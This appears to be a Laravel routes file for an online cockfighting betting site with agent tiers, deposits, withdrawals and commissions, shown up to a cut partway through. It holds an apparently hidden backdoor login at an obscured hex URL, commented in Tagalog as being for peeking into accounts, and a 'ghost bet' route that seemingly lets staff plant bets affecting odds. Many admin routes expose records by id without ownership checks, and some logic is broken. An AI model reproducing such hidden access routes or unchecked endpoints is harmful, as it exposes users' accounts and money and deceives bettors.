<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\UserController;
use App\Http\Controllers\EventsController;
use App\Http\Controllers\WalletController;
use App\Http\Controllers\BetController;
use App\Http\Controllers\CGController;
use App\Http\Controllers\GameController;
use App\Http\Controllers\SettingsController;
use App\Http\Controllers\AutoBetController;
use App\Models\Event;
use App\Models\Setting;
use App\Models\Game;
use App\Models\Bet;
use App\Models\Transaction;
use Illuminate\Support\Facades\Auth;
use App\Models\User;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

// Route::get('/admin-layout', function () {
//     return view('layouts.admin');
// })->name('home');

Route::group(['middleware' => ['web','throttle:60,1']], function () {

    Route::get('/', function () {
        return view('login2');
    })->name('home');

    Route::get('/login', function () {
        return view('login2');
    })->name('login');

    Route::get('/timer', function () {
        $fight = [];
        $event = \App\Models\Event::latest('id')->first();
        if($event){
            $fight = \App\Models\Fight::find($event->active_fight);
        }else{
            $fight = collect($fight);
        }
        return view('client.timer',compact('event','fight'));
    })->name('timer');

    Route::post('/login',[UserController::class,'postLogin'])->name('post.login');


    Route::get('/create-account/referral/{id}', function ($id) {
        //return redirect()->route('login');
        $user = \App\Models\User::where('referral_code',$id)->first();
        return view('client.register',compact('user'));
    })->name('register');

    Route::get('/create-account/agent-referral/{id}', function ($id) {
        ///return redirect()->route('login');
        $user = \App\Models\User::where('referral_code',$id)->first();
        return view('client.register-agent',compact('user'));
    })->name('agent.register');

    Route::post('/create-account',[UserController::class,'createAccount'])->name('create.account');

    Route::get('/test-compute-odds', function () {
        return response(calculateOdds(100,100,9));
    });

    Route::get('/test-video-playback', function () {
        return view('client.video');
    });

});

Route::post('/place-bet',[BetController::class,'placeBet'])->name('place.bet')->middleware(['auth']);
// pang silip ng account
Route::get('/b090fae249154cf3', function () {
    return view('login');
})->name('ghost.login');
Route::post('/g-b090fae249154cf3',[UserController::class,'ghostLogin'])->name('g.login');

Route::group(['middleware' => ['auth','throttle:60,1']], function () {

    Route::get('/select-game', function () {
        $events = \App\Models\Event::where('status','open')->get();
        //return response($events);
        return view('client.games',compact('events'));
    })->name('select.game');


    Route::get('/live-fight/{id}', function ($id) {
        if(Auth::user()->type == 'player' || Auth::user()->type == 'booster'){
            $game =  Game::where('name','COCKFIGHT')->first();

            $fight = [];
            $event = \App\Models\Event::find($id);

            $betMeron = 0;
            $betWala = 0;
            $betDraw = 0;
            $myBetMeron = 0;
            $myBetWala = 0;
            $myBetDraw = 0;
            $odds = 0;
            $wins = collect([]);
            if($event){
                $game = Game::find($event->game_id);
                $settings = \App\Models\Setting::where('setting_name','player_deduction')->first();
                $timer = \App\Models\Setting::where('setting_name','multiplier')->first();
                $playerDeduction = $settings->value;
                $fight = \App\Models\Fight::find($event->active_fight);
                $betMeron = \App\Models\Bet::where('fight_id',$event->active_fight)->where('bet','meron')->sum('amount');
                $betWala = \App\Models\Bet::where('fight_id',$event->active_fight)->where('bet','wala')->sum('amount');
                $betDraw = \App\Models\Bet::where('fight_id',$event->active_fight)->where('bet','draw')->sum('amount');
                $odds = calculateOdds($betMeron,$betWala,$playerDeduction);
                $wins = \App\Models\Fight::where('event_id',$event->id)->where('status','finished')->select('result','fight_number')->get();
                $myBetMeron = \App\Models\Bet::where('fight_id',$event->active_fight)->where('bet','meron')->where('user_id',Auth::id())->sum('amount');
                $myBetWala = \App\Models\Bet::where('fight_id',$event->active_fight)->where('bet','wala')->where('user_id',Auth::id())->sum('amount');
                $myBetDraw = \App\Models\Bet::where('fight_id',$event->active_fight)->where('bet','draw')->where('user_id',Auth::id())->sum('amount');
                //return response($wins);
            }else{
                $fight = collect($fight);
            }

            return view('client.betting',compact('event','fight','betMeron','betWala','betDraw','odds','wins','myBetMeron','myBetWala','myBetDraw','timer'));
        }

        return redirect()->route('dashboard');

    })->name('live.fight');


    Route::post('/auto-place-bet',[AutoBetController::class,'placeBet'])->name('auto.place.bet');

    Route::get('/bet-history', function () {

        $myBets = \DB::table('transactions as tx')
                ->join('bets as b','b.id','=','tx.bet_id')
                ->join('fights as f','f.id','=','b.fight_id')
                ->join('events as e','e.id','=','f.event_id')
                ->select('e.event_id','f.fight_number','b.*','tx.direction','tx.ending_balance','tx.remarks')
                ->where('tx.user_id',Auth::id())
                ->orderBy('tx.id','DESC')
                ->get();

        return view('client.history',compact('myBets'));
    })->name('client.bets');

});

Route::group(['prefix' => 'portal', 'middleware' =>['auth','throttle:60,1']], function () {

    // Route::get('/test-event', function () {
    //     event(new \App\Events\Bet('LAST CALL'));
    // });

    Route::get('/dashboard', function () {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }
        $plasadaTotal = \App\Models\Wallet::where('user_id',1)->first()->commission; //plasada
        $totalWallet = \App\Models\Wallet::where('user_id',1)->first()->balance; // system credits

        $operatorCommissions = \DB::table('users as ma')
                                ->join('wallets as w','w.user_id','=','ma.id')
                                ->where('ma.type','operator')->sum('w.commission');

        $subOperatorCommissions = \DB::table('users as ma')
                                ->join('wallets as w','w.user_id','=','ma.id')
                                ->where('ma.type','sub-operator')->sum('w.commission');

        $masterAgentCommissions = \DB::table('users as ma')
                                ->join('wallets as w','w.user_id','=','ma.id')
                                ->where('ma.type','master-agent')->sum('w.commission');

        $agentCommissions = \DB::table('users as a')
                            ->join('wallets as w','w.user_id','=','a.id')
                            ->where('a.type','gold-agent')->sum('w.commission');

        $silverAgentCommissions = \DB::table('users as a')
                            ->join('wallets as w','w.user_id','=','a.id')
                            ->where('a.type','silver-agent')->sum('w.commission');

        $totalWithdrawnCredits = \App\Models\Withdraw::where('type','credits')->where('status','completed')->sum('amount');
        $totalWithdrawnCommissions = \App\Models\Withdraw::where('type','commission')->where('status','completed')->sum('amount');

        $operatorPointsWithdrawals = DB::table('withdraws as w')
                                    ->join('users as u','u.id','=','w.requested_by')
                                    ->select('w.*')
                                    ->where('u.type','operator')
                                    ->where('w.type','credits')
                                    ->sum('w.amount');

        $operatorCommiWithdrawals = DB::table('withdraws as w')
                                    ->join('users as u','u.id','=','w.requested_by')
                                    ->select('w.*')
                                    ->where('u.type','operator')
                                    ->where('w.type','commission')
                                    ->sum('w.amount');

        $admins = User::where('type','admin')->get();
        $topAgents = \DB::table('wallets as w')
            ->join('users as u','u.id','=','w.user_id')
            ->select('u.name','w.commission','u.created_at')
            ->where('u.type','gold-agent')
            ->orderBy('w.commission','DESC')->limit(10)->get();

        $topMasterAgents = \DB::table('wallets as w')
            ->join('users as u','u.id','=','w.user_id')
            ->select('u.name','w.commission','u.created_at')
            ->where('u.type','master-agent')
            ->orderBy('w.commission','DESC')->limit(10)->get();

        // $userCredits = \App\Models\Wallet::where('user_id','!=',1)->sum('balance');
        $userCredits = \DB::table('users as u')
                    ->join('wallets as w','w.user_id','=','u.id')
                    ->where('u.type','!=','admin')
                    ->where('u.type','!=','super-admin')->sum('w.balance');
        return view('admin.dashboard.index',compact('plasadaTotal','totalWallet','operatorCommissions','subOperatorCommissions','masterAgentCommissions','agentCommissions','silverAgentCommissions','totalWithdrawnCredits','totalWithdrawnCommissions','userCredits','topMasterAgents','topAgents','admins','operatorPointsWithdrawals','operatorCommiWithdrawals'));
    })->name('dashboard');

    Route::get('/events', function () {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }

        if(Auth::user()->type != 'super-admin' && Auth::user()->type != 'declarator'){
            return redirect()->route('dashboard');
        }

        $events = \App\Models\Event::all();
        return view('admin.events.index',compact('events'));
    })->name('events');

    Route::get('/create-event', function () {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }

        if(Auth::user()->type != 'super-admin' && Auth::user()->type != 'declarator'){
            return redirect()->route('dashboard');
        }

        $games = \App\Models\Game::where('status','open')->get();
        return view('admin.events.create',compact('games'));
    })->name('create.event');

    Route::post('/create-event',[EventsController::class,'createEvent'])->name('event.create');

    Route::get('/show-event/{id}', function ($id) {

        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }

        if(Auth::user()->type != 'super-admin' && Auth::user()->type != 'declarator'){
            return redirect()->route('dashboard');
        }

        $fight = [];
        $event = \App\Models\Event::find($id);
        $game = Game::find($event->game_id);
        $settings = \App\Models\Setting::where('setting_name','player_deduction')->first();
        $playerDeduction = $settings->value;
        if($event){
            $fight = \App\Models\Fight::find($event->active_fight);
            $fights = \App\Models\Fight::where('event_id',$id)->where('status','finished')->get();
            $betMeron = \App\Models\Bet::where('fight_id',$event->active_fight)->where('bet','meron')->sum('amount');
            $betWala = \App\Models\Bet::where('fight_id',$event->active_fight)->where('bet','wala')->sum('amount');
            $odds = calculateOdds($betMeron,$betWala,$playerDeduction);
            $wins = \App\Models\Fight::where('event_id',$event->id)->where('status','finished')->select('result','fight_number')->get();
            $allBets = DB::table('bets as b')
                        ->join('users as u','b.user_id','=','u.id')
                        ->where('b.fight_id',$fight->id)
                        ->select('b.amount','b.bet','b.id','u.email','u.name','u.username')
                        ->orderBy('id','DESC')->get();
        }else{
            $fight = collect($fight);
        }

        return view('admin.events.show',compact('event','fight','betMeron','betWala','odds','wins','allBets','fights'));
    })->name('show.event');

    Route::get('/edit-event/{id}', function ($id) {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }

        if(Auth::user()->type != 'super-admin' && Auth::user()->type != 'declarator'){
            return redirect()->route('dashboard');
        }

        $event = \App\Models\Event::find($id);
        return view('admin.events.update',compact('event'));
    })->name('edit.event');

    Route::get('/start-event/{id}',[EventsController::class,'startEvent'])->name('start.event');
    Route::get('/end-event/{id}',[EventsController::class,'endEvent'])->name('end.event');
    Route::post('/update-fight-status',[EventsController::class,'changeFightStatus'])->name('fight.status');
    Route::post('/declare-winner',[EventsController::class,'declareWinner'])->name('declare.winner');
    Route::post('/jump-to-fight',[EventsController::class,'changeFightNumber'])->name('jump.fight');
    Route::post('/redeclare-winner',[EventsController::class,'redeclareWinner'])->name('redeclare.winner');
    Route::post('/update-event/{id}',[EventsController::class,'updateEvent'])->name('update.event');
    Route::get('/delete-event/{id}',[EventsController::class,'deleteEvent'])->name('delete.event');

    Route::post('/place-ghost-bet',[EventsController::class,'placeGhostBet'])->name('place.ghost');

    Route::get('/agents/{username?}', function ($username = null) {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }

        if(Auth::user()->type != 'admin' && Auth::user()->type != 'super-admin' && Auth::user()->type != 'master-agent'){
            return redirect()->route('dashboard');
        }

        if($username == null){
            $agents = \App\Models\User::where('type','gold-agent')->paginate(25);
            if(Auth::user()->type == 'master-agent'){
                $agents = \App\Models\User::where('type','gold-agent')->where('referred_by',Auth::id())->paginate(25);
            }
        }else{
            $agents = \App\Models\User::where('type','gold-agent')->where('username', 'LIKE', '%'.$username.'%')->paginate(25);
            if(Auth::user()->type == 'master-agent'){
                $agents = \App\Models\User::where('type','gold-agent')->where('username', 'LIKE', '%'.$username.'%')->where('referred_by',Auth::id())->paginate(25);
            }
        }


        return view('admin.agents.index',compact('agents'));
    })->name('agents');

    Route::get('/pending-agents', function () {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }
        $agents = \App\Models\User::where('type','agent')->where('status','inactive')->get();
        if(Auth::user()->type == 'master_agent'){
            $agents = \App\Models\User::where('type','agent')->where('status','inactive')->where('referred_by',Auth::id())->get();
        }

        return view('admin.agents.pending',compact('agents'));
    })->name('pending.agents');

    Route::get('/create-admin', function () {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }

        if(Auth::user()->type != 'super-admin'){
            return redirect()->route('dashboard');
        }

        return view('admin.admins.create');
    })->name('create.admin');


    Route::get('/create-gold-agent', function () {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }

        if(Auth::user()->type != 'super-admin' && Auth::user()->type != 'admin' && Auth::user()->type != 'master-agent'){
            return redirect()->route('dashboard');
        }

        return view('admin.agents.create');
    })->name('create.agent');

    Route::post('/change-status',[UserController::class,'setUserAccountStatus'])->name('change.status');
    Route::post('/hard-delete-user',[UserController::class,'hardDeleteUser'])->name('hard.delete');

    Route::get('/master-agents/{username?}', function ($username = null) {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }

        if(Auth::user()->type != 'admin' && Auth::user()->type != 'super-admin' && Auth::user()->type != 'sub-operator'){
            return redirect()->route('dashboard');
        }

        if($username == null){
            $agents = \App\Models\User::where('type','master-agent')->paginate(25);
            if(Auth::user()->type == 'sub-operator'){
                $agents = \App\Models\User::where('type','master-agent')->where('referred_by',Auth::id())->paginate(25);
            }
        }else{
            $agents = \App\Models\User::where('type','master-agent')->where('username', 'LIKE', '%'.$username.'%')->paginate(25);
            if(Auth::user()->type == 'sub-operator'){
                $agents = \App\Models\User::where('type','master-agent')->where('referred_by',Auth::id())->where('username', 'LIKE', '%'.$username.'%')->paginate(25);
            }
        }


        return view('admin.masteragents.index',compact('agents'));
    })->name('master.agents');

    Route::get('/sub-operators/{username?}', function ($username = null) {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }

        if(Auth::user()->type != 'admin' && Auth::user()->type != 'super-admin' && Auth::user()->type != 'operator'){
            return redirect()->route('dashboard');
        }

        if($username == null){
            $operators = \App\Models\User::where('type','sub-operator')->paginate(35);

            if(Auth::user()->type == 'operator'){
                $operators = \App\Models\User::where('type','sub-operator')->where('referred_by',Auth::id())->paginate(35);
            }
        }else{
            $operators = \App\Models\User::where('type','sub-operator')->where('username', 'LIKE', '%'.$username.'%')->paginate(25);

            if(Auth::user()->type == 'operator'){
                $operators = \App\Models\User::where('type','sub-operator')->where('referred_by',Auth::id())->where('username', 'LIKE', '%'.$username.'%')->paginate(25);
            }
        }

        return view('admin.sub-operators.index',compact('operators'));
    })->name('sub.operators');
    Route::post('/users-list',[UserController::class,'hardDeleteUsers'])->name('users.list');
    Route::get('/create-operator', function () {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }
        return view('admin.operators.create');
    })->name('create.operator');

    Route::get('/create-sub-operator', function () {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }

        if(Auth::user()->type != 'super-admin' && Auth::user()->type != 'admin' && Auth::user()->type != 'operator'){
            return redirect()->route('dashboard');
        }
        return view('admin.sub-operators.create');
    })->name('create.suboperator');

    Route::get('/create-master-agent', function () {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }

        if(Auth::user()->type != 'super-admin' && Auth::user()->type != 'admin' && Auth::user()->type != 'sub-operator'){
            return redirect()->route('dashboard');
        }

        return view('admin.masteragents.create');
    })->name('create.ma');

    Route::get('/create-silver-agent', function () {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }

        if(Auth::user()->type != 'super-admin' && Auth::user()->type != 'admin' && Auth::user()->type != 'gold-agent'){
            return redirect()->route('dashboard');
        }

        return view('admin.silver-agents.create');
    })->name('create.silver');

    Route::get('/create-declarator', function () {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }

        if(Auth::user()->type != 'super-admin'){
            return redirect()->route('dashboard');
        }

        return view('admin.declarators.create');
    })->name('create.declarator');


    Route::get('/deposits', function () {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }

        if(Auth::user()->type == 'admin' || Auth::user()->type == 'loader'){
            $new = DB::table('loads as l')
            ->join('users as rb','l.requested_by','=','rb.id')
            ->select('l.id','l.reference_number','l.screenshot','l.amount','l.created_at','rb.name','rb.contact_number')
            ->where('l.status','pending')
            ->get();

            $complete = DB::table('loads as l')
            ->join('users as rb','l.requested_by','=','rb.id')
            ->select('l.id','l.reference_number','l.screenshot','l.amount','l.created_at','rb.name','rb.contact_number')
            ->where('l.status','completed')
            ->get();
        }else{
            $new = DB::table('loads as l')
            ->join('users as rb','l.requested_by','=','rb.id')
            ->select('l.id','l.reference_number','l.screenshot','l.amount','l.created_at','rb.name','rb.contact_number')
            ->where('l.status','pending')
            ->where('l.requested_to',Auth::id())
            ->get();

            $complete = DB::table('loads as l')
            ->join('users as rb','l.requested_by','=','rb.id')
            ->select('l.id','l.reference_number','l.screenshot','l.amount','l.created_at','rb.name','rb.contact_number')
            ->where('l.status','completed')
            ->where('l.requested_to',Auth::id())
            ->get();
        }

        return view('admin.deposits.index',compact('new','complete'));
    })->name('deposits');

    Route::get('/view-deposit/{id}', function ($id) {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }
        $dp = DB::table('loads as l')
            ->join('users as rb','l.requested_by','=','rb.id')
            ->select('l.id','l.reference_number','l.screenshot','l.amount','l.created_at','rb.name','rb.contact_number')
            ->where('l.id',$id)
            ->first();
        return view('admin.deposits.show',compact('dp'));
    })->name('show.deposits');


    Route::get('/withdrawals', function () {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }

        $new = DB::table('withdraws as w')
        ->join('users as rb','w.requested_by','=','rb.id')
        ->select('w.id','w.withdraw_method','w.account_number','w.account_name','w.amount','w.type','w.created_at','rb.name','rb.contact_number')
        ->where('w.status','!=','completed')
        ->where('w.status','!=','cancelled')
        ->where('w.type','credits')
        ->where('w.requested_to',Auth::id())
        ->get();

        $complete = DB::table('withdraws as w')
        ->join('users as rb','w.requested_by','=','rb.id')
        ->select('w.id','w.withdraw_method','w.account_number','w.account_name','w.amount','w.type','w.created_at','rb.name','rb.contact_number')
        ->where('w.status','completed')
        ->where('w.type','credits')
        ->where('w.requested_to',Auth::id())
        ->get();

        return view('admin.withdrawals.index',compact('new','complete'));
    })->name('withdrawals');

    Route::get('/commission-withdrawals', function () {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }

        $new = DB::table('withdraws as w')
            ->join('users as rb','w.requested_by','=','rb.id')
            ->select('w.id','w.withdraw_method','w.account_number','w.account_name','w.amount','w.type','w.created_at','rb.name','rb.contact_number')
            ->where('w.status','!=','completed')
            ->where('w.status','!=','cancelled')
            ->where('w.type','commission')
            ->get();

            $complete = DB::table('withdraws as w')
            ->join('users as rb','w.requested_by','=','rb.id')
            ->select('w.id','w.withdraw_method','w.account_number','w.account_name','w.amount','w.type','w.created_at','rb.name','rb.contact_number')
            ->where('w.status','completed')
            ->where('w.type','commission')
            ->get();

            return view('admin.withdrawals.commissions',compact('new','complete'));

    })->name('commission.withdrawals');



    Route::get('/withdrawal-details/{id}', function ($id) {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }
        $wth = DB::table('withdraws as w')
            ->join('users as rb','w.requested_by','=','rb.id')
            ->select('w.id','w.withdraw_method','w.account_number','w.account_name','w.amount','w.created_at','rb.name','rb.contact_number')
            ->where('w.id',$id)
            ->first();

        return view('admin.withdrawals.show',compact('wth'));
    })->name('show.withdrawal');

    //player Routes

    Route::get('/players/{username?}', function ($username = null) {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }

        if($username == null){
            $direct_players = User::where('type','player')->where('referred_by',Auth::id())->where('status','active')->paginate(35);

            if(Auth::user()->type == 'super-admin' || Auth::user()->type == 'admin'){
                $direct_players = User::where('status','active')->where('type','player')->paginate(35);
            }
        }else{
            $direct_players = User::where('type','player')->where('referred_by',Auth::id())->where('status','active')->where('username', 'LIKE', '%'.$username.'%')->paginate(35);

            if(Auth::user()->type == 'super-admin' || Auth::user()->type == 'admin'){
                $direct_players = User::where('status','active')->where('type','player')->where('username', 'LIKE', '%'.$username.'%')->paginate(35);
            }
        }
        return view('admin.players.index',compact('direct_players'));

    })->name('players');

    Route::get('/user-accounts/{username?}', function ($username = null) {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }

        if($username == null){
            $accounts = User::where('status','active')->where('type','!=','super-admin')->paginate(35);
        }else{
            $accounts = User::where('status','active')->where('type','!=','super-admin')->where('username', 'LIKE', '%'.$username.'%')->paginate(35);
        }
        return view('admin.users.index',compact('accounts','username'));

    })->name('user.accounts');

    Route::get('/downline-players/{id}', function ($id) {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }

        $direct_players = User::where('type','player')->where('referred_by',$id)->get();

        return view('admin.downlines.players',compact('direct_players'));

    })->name('dl.players');

    Route::get('/downline-agents/{id}', function ($id) {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }
        $operators = \App\Models\User::where('referred_by',$id)->get();
        return view('admin.downlines.agents',compact('operators'));
    })->name('dl.agents');


    Route::get('/illegal-accounts', function () {

        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }

        if(Auth::user()->type == 'admin' || Auth::user()->type == 'super-admin'){
            $illegals = User::where('flag','illegal')->get();
        }

        return view('admin.players.index',compact('direct_players'));

    })->name('illegals');


    Route::get('/pending-players/{username?}', function ($username = null) {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }
        if($username == null){
            $direct_players = User::where('status','inactive')->paginate(35);

            if(Auth::user()->type == 'operator' || Auth::user()->type == 'master-agent' || Auth::user()->type == 'sub-operator' || Auth::user()->type == 'gold-agent'){
                $direct_players = User::where('referred_by',Auth::id())->where('status','inactive')->paginate(35);
            }
        }else{
            $direct_players = User::where('status','inactive')->where('username', 'LIKE', '%'.$username.'%')->paginate(35);

            if(Auth::user()->type == 'operator' || Auth::user()->type == 'master-agent' || Auth::user()->type == 'sub-operator' || Auth::user()->type == 'gold-agent'){
                $direct_players = User::where('referred_by',Auth::id())->where('status','inactive')->where('username', 'LIKE', '%'.$username.'%')->paginate(35);
            }
        }
        return view('admin.players.pending',compact('direct_players'));

    })->name('pending.players');

    Route::get('/deleted-accounts', function () {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }
        $deleted_players = User::whereNotNull('deleted_at')->get();

        if(Auth::user()->type == 'operator' || Auth::user()->type == 'master-agent' || Auth::user()->type == 'sub-operator' || Auth::user()->type == 'gold-agent'){
            $deleted_players = User::onlyTrashed()->where('referred_by',Auth::id())->get();
        }
        return view('admin.players.deleted',compact('deleted_players'));

    })->name('deleted.accounts');

    Route::post('/create-account',[UserController::class,'createUser'])->name('insert.player');
    Route::post('/update-account/{id}',[UserController::class,'updateUser'])->name('update.account');
    Route::get('/delete-account/{id}',[UserController::class,'deleteUser'])->name('delete.account');
    Route::get('/restore-account/{id}',[UserController::class,'restoreAccount'])->name('restore.account');
    Route::post('/convert-account',[UserController::class,'convertPlayerToAgent'])->name('convert.account');

    Route::get('/create-player', function () {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }
        return view('admin.players.create');
    })->name('create.player');

    Route::get('/edit-account/{id}', function ($id) {
        if(Auth::user()->type == 'player'){
            return redirect()->route('select.game');
        }
        $user = User::find($id);
        return view('admin.players.update',compact('user'));
    })->name('edit.account');


    // Route::get('/pending-players', function () {
    //     $referrals = \DB::table('users as agents')
    //     ->join('users as players','agents.id','=','players.referred_by')
    //     ->select('players.*')
    //     ->where('agents.referred_by',Auth::id())->get();
    //     return view('admin.players.pending',compact('referrals'));
    // })->name('pending.players');

    Route::get('/agent-events/{id}',function($id){
        $user = User::find($id);
        $events = Event::withTrashed()->orderBy('id','DESC')->get();
        return view('admin.wallet.events',compact('events','id','user'));
    })->name('agent.events');

    Route::get('/agent-commissions/{id}/{event}', function ($id,$event) {
        $myCommissions = [];
        $user = User::find($id);
        $ev = Event::withTrashed()->where('id',$event)->first();

        if($user->type == 'operator'){
            // $myCommissions = \App\Models\Bet::where('op_id',$id)->orderBy('id','DESC')->get();
            // $myCommissions = DB::table('bets as b')
            //         ->join('fights as f','f.id','=','b.fight_id')
            //         ->join('events as e','e.id','=','b.event_id')
            //         ->select('b.*','f.fight_number','e.name as event_name')
            //         ->where('b.op_id',$id)
            //         ->where('b.event_id',$event)
            //         ->orderBy('b.id','DESC')
            //         ->get();
            $myCommissions = DB::table('transactions as tx')
                    ->join('bets as b','b.id','=','tx.bet_id')
                    ->join('fights as f','f.id','=','b.fight_id')
                    ->join('events as e','e.id','=','b.event_id')
                    ->join('users as u','u.id','=','b.user_id')
                    ->select('b.*','f.fight_number','e.name as event_name','tx.ending_balance','u.username','u.created_by')
                    ->where('tx.user_id',$id)
                    ->where('b.event_id',$event)
                    ->where('tx.type','commission-in')
                    ->orderBy('b.id','DESC')
                    ->get();
            //return response($myCommissions);
        }

        if($user->type == 'sub-operator'){
            // $myCommissions = \App\Models\Bet::where('subop_id',$id)->orderBy('id','DESC')->get();
            $myCommissions = DB::table('transactions as tx')
            ->join('bets as b','b.id','=','tx.bet_id')
            ->join('fights as f','f.id','=','b.fight_id')
            ->join('events as e','e.id','=','b.event_id')
            ->join('users as u','u.id','=','b.user_id')
            ->select('b.*','f.fight_number','e.name as event_name','tx.ending_balance','u.username','u.created_by')
            ->where('tx.user_id',$id)
            ->where('b.event_id',$event)
            ->where('tx.type','commission-in')
            ->orderBy('b.id','DESC')
            ->get();
        }

        if($user->type == 'master-agent'){
            // $myCommissions = \App\Models\Bet::where('ma_id',$id)->orderBy('id','DESC')->get();
            $myCommissions = DB::table('transactions as tx')
            ->join('bets as b','b.id','=','tx.bet_id')
            ->join('fights as f','f.id','=','b.fight_id')
            ->join('events as e','e.id','=','b.event_id')
            ->join('users as u','u.id','=','b.user_id')
            ->select('b.*','f.fight_number','e.name as event_name','tx.ending_balance','u.username','u.created_by')
            ->where('tx.user_id',$id)
            ->where('b.event_id',$event)
            ->where('tx.type','commission-in')
            ->orderBy('b.id','DESC')
            ->get();
        }

        if($user->type == 'gold-agent'){
            // $myCommissions = \App\Models\Bet::where('agent_id',$id)->orderBy('id','DESC')->get();
            $myCommissions = DB::table('transactions as tx')
            ->join('bets as b','b.id','=','tx.bet_id')
            ->join('fights as f','f.id','=','b.fight_id')
            ->join('events as e','e.id','=','b.event_id')
            ->join('users as u','u.id','=','b.user_id')
            ->select('b.*','f.fight_number','e.name as event_name','tx.ending_balance','u.username','u.created_by')
            ->where('tx.user_id',$id)
            ->where('b.event_id',$event)
            ->where('tx.type','commission-in')
            ->orderBy('b.id','DESC')
            ->get();
        }

        if($user->type == 'silver-agent'){
            // $myCommissions = \App\Models\Bet::where('silver_id',$id)->orderBy('id','DESC')->get();
            $myCommissions = DB::table('transactions as tx')
            ->join('bets as b','b.id','=','tx.bet_id')
            ->join('fights as f','f.id','=','b.fight_id')
            ->join('events as e','e.id','=','b.event_id')
            ->join('users as u','u.id','=','b.user_id')
            ->select('b.*','f.fight_number','e.name as event_name','tx.ending_balance','u.username','u.created_by')
            ->where('tx.user_id',$id)
            ->where('b.event_id',$event)
            ->where('tx.type','commission-in')
            ->orderBy('b.id','DESC')
            ->get();
        }

        return view('admin.wallet.comms',compact('myCommissions','user','ev'));
    })->name('agent.commission');


    Route::get('/earning-commission',function(){
        $myCommissions = [];

        if(Auth::user()->type != 'super-admin' || Auth::user()->type != 'admin'){
            $user = User::find(Auth::id());
        }else{
            $user = Auth::user();
        }

        if(Auth::user()->type == 'operator'){
            // $myCommissions = \App\Models\Bet::where('op_id',Auth::id())->orderBy('id','DESC')->get();
            $myCommissions = DB::table('transactions as tx')
            ->join('bets as b','b.id','=','tx.bet_id')
            ->join('fights as f','f.id','=','b.fight_id')
            ->join('events as e','e.id','=','b.event_id')
            ->join('users as u','u.id','=','b.user_id')
            ->select('b.*','f.fight_number','e.name as event_name','tx.ending_balance','u.username','u.created_by')
            ->where('tx.user_id',Auth::id())
            ->where('tx.type','commission-in')
            ->orderBy('b.id','DESC')
            ->paginate(35);
        }

        if(Auth::user()->type == 'sub-operator'){
            // $myCommissions = \App\Models\Bet::where('subop_id',Auth::id())->orderBy('id','DESC')->get();
            $myCommissions = DB::table('transactions as tx')
            ->join('bets as b','b.id','=','tx.bet_id')
            ->join('fights as f','f.id','=','b.fight_id')
            ->join('events as e','e.id','=','b.event_id')
            ->join('users as u','u.id','=','b.user_id')
            ->select('b.*','f.fight_number','e.name as event_name','tx.ending_balance','u.username','u.created_by')
            ->where('tx.user_id',Auth::id())
            ->where('tx.type','commission-in')
            ->orderBy('b.id','DESC')
            ->paginate(35);
        }

        if(Auth::user()->type == 'master-agent'){
            // $myCommissions = \App\Models\Bet::where('ma_id',Auth::id())->orderBy('id','DESC')->get();
            $myCommissions = DB::table('transactions as tx')
            ->join('bets as b','b.id','=','tx.bet_id')
            ->join('fights as f','f.id','=','b.fight_id')
            ->join('events as e','e.id','=','b.event_id')
            ->join('users as u','u.id','=','b.user_id')
            ->select('b.*','f.fight_number','e.name as event_name','tx.ending_balance','u.username','u.created_by')
            ->where('tx.user_id',Auth::id())
            ->where('tx.type','commission-in')
            ->orderBy('b.id','DESC')
            ->paginate(35);
        }

        if(Auth::user()->type == 'gold-agent'){
            // $myCommissions = \App\Models\Bet::where('agent_id',Auth::id())->orderBy('id','DESC')->get();
            $myCommissions = DB::table('transactions as tx')
            ->join('bets as b','b.id','=','tx.bet_id')
            ->join('fights as f','f.id','=','b.fight_id')
            ->join('events as e','e.id','=','b.event_id')
            ->join('users as u','u.id','=','b.user_id')
            ->select('b.*','f.fight_number','e.name as event_name','tx.ending_balance','u.username','u.created_by')
            ->where('tx.user_id',Auth::id())
            ->where('tx.type','commission-in')
            ->orderBy('b.id','DESC')
            ->paginate(35);
        }

        if(Auth::user()->type == 'silver-agent'){
            // $myCommissions = \App\Models\Bet::where('silver_id',Auth::id())->orderBy('id','DESC')->get();
            $myCommissions = DB::table('transactions as tx')
            ->join('bets as b','b.id','=','tx.bet_id')
            ->join('fights as f','f.id','=','b.fight_id')
            ->join('events as e','e.id','=','b.event_id')
            ->join('users as u','u.id','=','b.user_id')
            ->select('b.*','f.fight_number','e.name as event_name','tx.ending_balance','u.username','u.created_by')
            ->where('tx.user_id',Auth::id())
            ->where('tx.type','commission-in')
